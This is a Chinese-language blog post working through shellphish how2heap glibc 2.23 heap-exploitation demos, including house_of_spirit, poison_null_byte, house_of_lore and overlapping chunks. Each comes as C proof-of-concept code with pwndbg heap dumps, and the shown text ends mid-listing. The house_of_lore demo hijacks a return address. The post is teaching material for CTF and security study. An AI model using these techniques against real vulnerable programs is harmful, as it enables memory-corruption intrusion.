<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="how2heap(持续更新ing）, StarrySky">
    <meta name="description" content="Love rises from the east and descends to the west,romance makes no changes until death.">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>how2heap(持续更新ing） | StarrySky</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="StarrySky" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">StarrySky</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>主页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>文章</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>个人简介</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">StarrySky</div>
        <div class="logo-desc">
            
            Love rises from the east and descends to the west,romance makes no changes until death.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			主页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			文章
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			个人简介
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友链
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/starrysky1004" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/starrysky1004" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">how2heap(持续更新ing）</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/pwn/">
                                <span class="chip bg-color">pwn</span>
                            </a>
                        
                            <a href="/tags/heap/">
                                <span class="chip bg-color">heap</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/heap/" class="post-category">
                                heap
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-05-22
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2023-07-27
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    14k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    76 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>[TOC]</p>
<p><code>how2heap</code>源码地址：<a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/tree/master">https://github.com/shellphish/how2heap/tree/master</a></p>
<p>本篇去除了所有注释（太占地方啦</p>
<h2 id="glibc-2-23"><a href="#glibc-2-23" class="headerlink" title="glibc_2.23"></a>glibc_2.23</h2><h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;

void main() &#123;
	void* p1 &#x3D; calloc(1,0x40);
	free(p1);
	void* p3 &#x3D; malloc(0x400);
    
    assert(p1 &#x3D;&#x3D; p3);

	free(p1);
	void *p4 &#x3D; malloc(0x400);

	assert(p4 &#x3D;&#x3D; p3);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>p1</code>被释放进入<code>fastbin</code>之后创建大小属于<code>large bin</code>的堆<code>p3</code>，判断完<code>p3</code>不属于<code>fastbin</code>和<code>small bin</code>之后进行<code>malloc consolidate</code>将<code>p1</code>整理到<code>unsorted bin</code>，又被合并到<code>top chunk</code>,在申请堆<code>p3</code>时就从<code>top chunk</code>取的堆，所以<code>p3</code>和<code>p1</code>地址相同，而此时<code>chunk1</code>地址成为了<code>chunk3</code>的地址，再次释放<code>chunk1</code>释放的就是<code>chunk3</code>，再申请与<code>chunk3</code>大小相同的堆时申请到的就是<code>chunk3</code>地址，因此<code>p4 = p3</code>且两个指针都未置零，因为释放的是<code>p1</code></p>
<h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
&#123;
        malloc(1);
    
        unsigned long long *a;
        unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
    
        fake_chunks[1] &#x3D; 0x40; 
        fake_chunks[9] &#x3D; 0x1234; 
    
        a &#x3D; &amp;fake_chunks[2];
    
        free(a);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在栈中取了一个地址布置<code>fake_chunk</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffe1b0
0x7fffffffe1b0: 0x0000000000000001      0x0000000000000040	#size
0x7fffffffe1c0: 0x00007ffff7ffe168      0x00000000000000f0
0x7fffffffe1d0: 0x00000000000000c2      0x000055555555542d
0x7fffffffe1e0: 0x00007fffffffe20e      0x0000000000000000
0x7fffffffe1f0: 0x00005555555553e0      0x0000000000001234	#next size<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>伪造成功即可释放<code>fake_chunk</code>到<code>bin</code>，其中<code>free</code>的地址是<code>user data</code>地址</p>
<h3 id="poison-null-byte-x2F-off-by-null"><a href="#poison-null-byte-x2F-off-by-null" class="headerlink" title="poison_null_byte&#x2F;off-by-null"></a>poison_null_byte&#x2F;off-by-null</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;
#include &lt;assert.h&gt;


int main()
&#123;
        setbuf(stdin, NULL);
        setbuf(stdout, NULL);

        uint8_t* a;
        uint8_t* b;
        uint8_t* c;
        uint8_t* b1;
        uint8_t* b2;
        uint8_t* d;
        void *barrier;

        a &#x3D; (uint8_t*) malloc(0x100);
        int real_a_size &#x3D; malloc_usable_size(a);
    
        b &#x3D; (uint8_t*) malloc(0x200);
        c &#x3D; (uint8_t*) malloc(0x100);
    
        barrier &#x3D;  malloc(0x100);
    
        uint64_t* b_size_ptr &#x3D; (uint64_t*)(b - 8);

        *(size_t*)(b+0x1f0) &#x3D; 0x200;

        free(b);

        a[real_a_size] &#x3D; 0; 
    
        uint64_t* c_prev_size_ptr &#x3D; ((uint64_t*)c)-2;
    
        b1 &#x3D; malloc(0x100);
        b2 &#x3D; malloc(0x80);

        memset(b2,&#39;B&#39;,0x80);
    
        free(b1);
        free(c);
    
        d &#x3D; malloc(0x300);
    
        memset(d,&#39;D&#39;,0x300);
    
        assert(strstr(b2, &quot;DDDDDDDDDDDD&quot;));
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>条件</strong>：没有<code>tcache</code>且有<code>off-by-one</code>漏洞</p>
<p>首先创建了四个堆，其中<code>barrier</code>是为了防止释放<code>c</code>时与<code>top chunk</code>合并</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555c000			#a
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x55555555c110			#b
Size: 0x211

Allocated chunk | PREV_INUSE
Addr: 0x55555555c320			#c
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x55555555c430			#barrier
Size: 0x111

Top chunk | PREV_INUSE
Addr: 0x55555555c540
Size: 0x20ac1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将堆<code>b</code>的末尾伪造成<code>next_chunk</code>的<code>prev_size</code>，使得通过<code>off-by-null</code>修改<code>b</code>的<code>size</code>的后两位为<code>0</code>之后依然能够绕过<code>size = prve_size(next_chunk)</code></p>
<pre class="line-numbers language-none"><code class="language-none">0x55555555c310: 0x0000000000000200      0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>释放堆<code>b</code>并通过<code>off-by-null</code>将<code>b</code>的大小改成<code>0x200</code>，此时<code>c</code>被识别到伪造的<code>next_chunk</code>处，由于没有修改<code>size</code>位所以<code>size</code>为<code>0</code>，但已经绕过了检查</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555c000
Size: 0x111

Free chunk (unsortedbin)
Addr: 0x55555555c110
Size: 0x200
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555c310
Size: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个<code>0x100</code>的堆<code>b1</code>和一个<code>0x80</code>的堆<code>b2</code>,此时堆从<code>unsorted bin</code>中分割，地址在刚刚释放的<code>b</code>处</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555c000
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x55555555c110
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x55555555c220
Size: 0x91

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555c2b0
Size: 0x61
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555c310
Size: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>且真实的<code>c</code>的<code>prve_size</code>没有更新，而是更新了伪造的<code>prve_size</code></p>
<pre class="line-numbers language-none"><code class="language-none">0x55555555c310: 0x0000000000000060      0x0000000000000000
0x55555555c320: 0x0000000000000210      0x0000000000000110<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>此时释放<code>b1</code>和<code>c</code>，会将<code>b1</code>和<code>c</code>合并成一个覆盖<code>b2</code>的堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555c000
Size: 0x111

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555c110
Size: 0x321
fd: 0x55555555c2b0
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555c430
Size: 0x110

Top chunk | PREV_INUSE
Addr: 0x55555555c540
Size: 0x20ac1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时将合并的堆申请出来就能实现<code>overlap</code>，即申请的空间覆盖了<code>b2</code></p>
<h3 id="house-of-lore-x2F-small-bin"><a href="#house-of-lore-x2F-small-bin" class="headerlink" title="house_of_lore&#x2F;small bin"></a>house_of_lore&#x2F;small bin</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;

void jackpot()&#123; fprintf(stderr, &quot;Nice jump d00d\n&quot;); exit(0); &#125;

int main(int argc, char * argv[])&#123;

  intptr_t* stack_buffer_1[4] &#x3D; &#123;0&#125;;
  intptr_t* stack_buffer_2[3] &#x3D; &#123;0&#125;;

  intptr_t *victim &#x3D; malloc(0x100);
  intptr_t *victim_chunk &#x3D; victim-2;
    
  stack_buffer_1[0] &#x3D; 0;
  stack_buffer_1[1] &#x3D; 0;
  stack_buffer_1[2] &#x3D; victim_chunk;

  stack_buffer_1[3] &#x3D; (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] &#x3D; (intptr_t*)stack_buffer_1;

  void *p5 &#x3D; malloc(1000);
 
  free((void*)victim);

  void *p2 &#x3D; malloc(1200);

  victim[1] &#x3D; (intptr_t)stack_buffer_1;

  void *p3 &#x3D; malloc(0x100);
  char *p4 &#x3D; malloc(0x100);
    
  intptr_t sc &#x3D; (intptr_t)jackpot; 
  memcpy((p4+40), &amp;sc, 8);

  assert((long)__builtin_return_address(0) &#x3D;&#x3D; (long)jackpot);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个<code>small bin</code>之后在栈上伪造以该堆为起点的链，包含两个<code>fake chunk</code>,伪造过程即修改三个堆的<code>fd</code>和<code>bk</code>区域的位置，这样就可以绕过<code>small bin</code> 对<code>fd</code>以及需要申请的<code>fake chunk</code>不能在<code>small bin</code>链的尾部的检查，申请相同大小的堆即可将<code>fake chunk</code>申请出来。</p>
<p>相关<code>glibc</code>源码：</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; last (bin)) !&#x3D; bin)
        &#123;
          if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;
            malloc_consolidate (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-C" data-language="C"><code class="language-C">else
           &#123;
             bck &#x3D; victim-&gt;bk;
if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))
               &#123;
                 errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;
                 goto errout;
               &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从<code>small bin</code> 申请堆的时候会判断最后一个堆的<code>bk</code>指向的堆的<code>fd</code>是否是该堆，因此在需要申请的位置后面还要再伪造一个堆</p>
<p>创建两个堆（第二个防止合并），并且在栈上伪造一个链表</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x55555555b110
Size: 0x3f1

Top chunk | PREV_INUSE
Addr: 0x55555555b500
Size: 0x20b01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd60
0x7fffffffdd60:	0x0000000000000000	0x0000000000000000
0x7fffffffdd70:	0x000055555555b000	0x00007fffffffdd40<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x00007fffffffdd40
0x7fffffffdd40:	0x0000000000000000	0x0000000000000000
0x7fffffffdd50:	0x00007fffffffdd60<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>释放第一个堆并且再次创建一个堆使其进入<code>small bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Free chunk (smallbins) | PREV_INUSE
Addr: 0x55555555b000
Size: 0x111
fd: 0x7ffff7dd1c78
bk: 0x7ffff7dd1c78

Allocated chunk
Addr: 0x55555555b110
Size: 0x3f0

Allocated chunk | PREV_INUSE
Addr: 0x55555555b500
Size: 0x4c1

Top chunk | PREV_INUSE
Addr: 0x55555555b9c0
Size: 0x20641<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>改堆的<code>bk</code>为栈上伪造的堆的地址，第二次申请即可得到栈上的地址</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Free chunk (smallbins) | PREV_INUSE
Addr: 0x55555555b000
Size: 0x111
fd: 0x7ffff7dd1c78
bk: 0x7fffffffdd60

Allocated chunk | PREV_INUSE
Addr: 0x55555555b110
Size: 0x3f1

Allocated chunk | PREV_INUSE
Addr: 0x55555555b500
Size: 0x4c1

Top chunk | PREV_INUSE
Addr: 0x55555555b9c0
Size: 0x20641<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;

int main(int argc , char* argv[])&#123;


	intptr_t *p1,*p2,*p3,*p4;

	p1 &#x3D; malloc(0x100 - 8);
	p2 &#x3D; malloc(0x100 - 8);
	p3 &#x3D; malloc(0x80 - 8);

	memset(p1, &#39;1&#39;, 0x100 - 8);
	memset(p2, &#39;2&#39;, 0x100 - 8);
	memset(p3, &#39;3&#39;, 0x80 - 8);

    free(p2);

	int evil_chunk_size &#x3D; 0x181;
	int evil_region_size &#x3D; 0x180 - 8;

	*(p2-1) &#x3D; evil_chunk_size; 
    
	p4 &#x3D; malloc(evil_region_size);
    
	memset(p4, &#39;4&#39;, evil_region_size);
	memset(p3, &#39;3&#39;, 80);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建两个实际大小为<code>0x101</code>的堆和一个<code>0x81</code>的堆，释放第二个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x101

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555b100
Size: 0x101
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555b200
Size: 0x80

Top chunk | PREV_INUSE
Addr: 0x55555555b280
Size: 0x20d81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将被释放的堆的大小改成第二、三个堆的大小之和， 此时第二个堆覆盖了第三个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x101

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555b100
Size: 0x181
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Top chunk | PREV_INUSE
Addr: 0x55555555b280
Size: 0x20d81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再将该堆申请出来即可实现<code>overlap</code>,即申请的堆包含了初始的第三个堆且可向其写入数据</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x101

Allocated chunk | PREV_INUSE
Addr: 0x55555555b100
Size: 0x181

Top chunk | PREV_INUSE
Addr: 0x55555555b280
Size: 0x20d81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>实现效果：存在两个堆，使得上一个堆覆盖到下一个堆</p>
<h3 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;

int main()&#123;
  
  intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
  int prev_in_use &#x3D; 0x1;

  p1 &#x3D; malloc(1000);
  p2 &#x3D; malloc(1000);
  p3 &#x3D; malloc(1000);
  p4 &#x3D; malloc(1000);
  p5 &#x3D; malloc(1000);

  real_size_p1 &#x3D; malloc_usable_size(p1);
  real_size_p2 &#x3D; malloc_usable_size(p2);
  real_size_p3 &#x3D; malloc_usable_size(p3);
  real_size_p4 &#x3D; malloc_usable_size(p4);
  real_size_p5 &#x3D; malloc_usable_size(p5);

  memset(p1,&#39;A&#39;,real_size_p1);
  memset(p2,&#39;B&#39;,real_size_p2);
  memset(p3,&#39;C&#39;,real_size_p3);
  memset(p4,&#39;D&#39;,real_size_p4);
